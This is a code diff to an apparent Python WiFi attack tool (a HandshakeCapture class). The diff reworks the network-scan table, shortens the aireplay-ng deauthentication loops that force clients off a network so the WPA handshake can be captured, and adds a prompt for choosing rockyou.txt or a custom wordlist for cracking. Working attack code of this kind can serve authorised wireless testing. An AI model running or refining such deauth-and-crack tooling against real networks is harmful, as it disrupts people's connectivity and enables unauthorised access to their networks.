@@ -14,6 +14,8 @@ from .utils import (
 )
 import json
 from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
+from rich.prompt import Confirm
+from rich.table import Table
 
 class HandshakeCapture:
     def __init__(self):
@@ -119,11 +121,23 @@ class HandshakeCapture:
                             if len(parts) >= 14:  # Valid network line
                                 essid = parts[13].strip()
                                 if essid and essid != "":  # Only add networks with valid ESSID
+                                    power = parts[8].strip()
+                                    # Convert power to dBm if it's a negative number
+                                    try:
+                                        power_val = int(power)
+                                        if power_val > 0:
+                                            power = f"-{power_val} dBm"
+                                        else:
+                                            power = f"{power_val} dBm"
+                                    except:
+                                        power = "N/A"
+                                        
                                     networks.append({
                                         'bssid': parts[0].strip(),
                                         'channel': parts[3].strip(),
                                         'essid': essid,
-                                        'power': parts[8].strip()
+                                        'power': power,
+                                        'encryption': parts[5].strip()
                                     })
             except:
                 pass
@@ -143,14 +157,24 @@ class HandshakeCapture:
             self.console.print("[red]No networks found![/red]")
             return False
             
-        self.console.print("\n[green]Available Networks:[/green]")
+        # Create and populate table
+        table = Table(title="Available Networks")
+        table.add_column("Index", style="cyan", justify="center")
+        table.add_column("BSSID", style="green")
+        table.add_column("Channel", justify="center")
+        table.add_column("ESSID", style="bright_white")
+        table.add_column("Signal", justify="center")
+        
         for idx, network in enumerate(networks, 1):
-            self.console.print(
-                f"{idx}. {network['essid']} "
-                f"(BSSID: {network['bssid']}, "
-                f"Channel: {network['channel']}, "
-                f"Signal: {network['power']})"
+            table.add_row(
+                str(idx),
+                network['bssid'],
+                network['channel'],
+                network['essid'],
+                network['power']
             )
+        
+        self.console.print(table)
         
         while True:
             try:
@@ -163,7 +187,7 @@ class HandshakeCapture:
                     return True
             except ValueError:
                 pass
-            self.console.print("[red]Invalid choice![/red]")
+            self.console.print("[red]Invalid choice! Please enter a number between 1 and {}[/red]".format(len(networks)))
         
         return False
 
@@ -207,16 +231,16 @@ class HandshakeCapture:
             if clients:
                 self.console.print(f"\n[green]Found {len(clients)} connected clients[/green]")
                 
-                # Phase 1: Send deauth packets for 5 seconds
+                # Phase 1: Send deauth packets for 2.5 seconds
                 with Progress(
                     SpinnerColumn(),
                     TextColumn("[progress.description]{task.description}"),
                     TimeElapsedColumn(),
                 ) as progress:
-                    task = progress.add_task("[red]Sending deauth packets...", total=50)
+                    task = progress.add_task("[red]Sending deauth packets...", total=25)
                     
-                    # Send deauth packets for 5 seconds (10 packets per second)
-                    for _ in range(50):
+                    # Send deauth packets for 2.5 seconds (10 packets per second)
+                    for _ in range(25):
                         for client in clients:
                             deauth_cmd = [
                                 'aireplay-ng',
@@ -235,10 +259,10 @@ class HandshakeCapture:
                     TextColumn("[progress.description]{task.description}"),
                     TimeElapsedColumn(),
                 ) as progress:
-                    task = progress.add_task("[cyan]Waiting for handshake...", total=50)
+                    task = progress.add_task("[cyan]Waiting for handshake...", total=25)
                     
-                    # Wait for 5 seconds, checking for handshake
-                    for _ in range(50):
+                    # Wait for 2.5 seconds, checking for handshake
+                    for _ in range(25):
                         if self.verify_handshake():
                             self.console.print("\n[green]Handshake captured![/green]")
                             capture_process.terminate()
@@ -248,16 +272,16 @@ class HandshakeCapture:
             else:
                 self.console.print("\n[yellow]No clients found. Sending broadcast deauth...[/yellow]")
                 
-                # Phase 1: Send broadcast deauth packets for 5 seconds
+                # Phase 1: Send broadcast deauth packets for 2.5 seconds
                 with Progress(
                     SpinnerColumn(),
                     TextColumn("[progress.description]{task.description}"),
                     TimeElapsedColumn(),
                 ) as progress:
-                    task = progress.add_task("[red]Sending broadcast deauth...", total=50)
+                    task = progress.add_task("[red]Sending broadcast deauth...", total=25)
                     
-                    # Send broadcast deauth packets for 5 seconds (10 packets per second)
-                    for _ in range(50):
+                    # Send broadcast deauth packets for 2.5 seconds (10 packets per second)
+                    for _ in range(25):
                         deauth_cmd = [
                             'aireplay-ng',
                             '--deauth', '1',
@@ -274,10 +298,10 @@ class HandshakeCapture:
                     TextColumn("[progress.description]{task.description}"),
                     TimeElapsedColumn(),
                 ) as progress:
-                    task = progress.add_task("[cyan]Waiting for handshake...", total=50)
+                    task = progress.add_task("[cyan]Waiting for handshake...", total=25)
                     
-                    # Wait for 5 seconds, checking for handshake
-                    for _ in range(50):
+                    # Wait for 2.5 seconds, checking for handshake
+                    for _ in range(25):
                         if self.verify_handshake():
                             self.console.print("\n[green]Handshake captured![/green]")
                             capture_process.terminate()
@@ -382,30 +406,27 @@ class HandshakeCapture:
                 self.console.print("[red]Error: Capture file not found![/red]")
                 return False
 
-            # Ask user for wordlist choice
-            self.console.print("\n[cyan]Wordlist Options:[/cyan]")
-            self.console.print("1. Use default wordlist (rockyou.txt)")
-            self.console.print("2. Use custom wordlist")
+            # Ask user about wordlist choice
+            self.console.print("\n[cyan]Wordlist Selection[/cyan]")
+            self.console.print("Default wordlist is rockyou.txt")
             
-            while True:
-                try:
-                    choice = input("\nSelect option (1-2): ").strip()
-                    if choice == "1":
-                        if not self.rockyou_path or not os.path.exists(self.rockyou_path):
-                            self.console.print("[red]Error: rockyou.txt not found![/red]")
+            wordlist_path = None
+            use_custom = Confirm.ask("Do you want to use a custom wordlist?", default=False)
+            
+            if not use_custom:
+                if not self.rockyou_path or not os.path.exists(self.rockyou_path):
+                    self.console.print("[red]Error: rockyou.txt not found![/red]")
+                    return False
+                wordlist_path = self.rockyou_path
+            else:
+                while not wordlist_path:
+                    custom_path = input("\nEnter path to custom wordlist: ").strip()
+                    if os.path.exists(custom_path):
+                        wordlist_path = custom_path
+                    else:
+                        self.console.print("[red]Error: Wordlist file not found![/red]")
+                        if not Confirm.ask("Try another path?", default=True):
                             return False
-                        wordlist_path = self.rockyou_path
-                        break
-                    elif choice == "2":
-                        custom_path = input("\nEnter path to custom wordlist: ").strip()
-                        if os.path.exists(custom_path):
-                            wordlist_path = custom_path
-                            break
-                        else:
-                            self.console.print("[red]Error: Wordlist file not found![/red]")
-                except ValueError:
-                    pass
-                self.console.print("[red]Invalid choice![/red]")
 
             # Setup output file
             password_file = os.path.join(
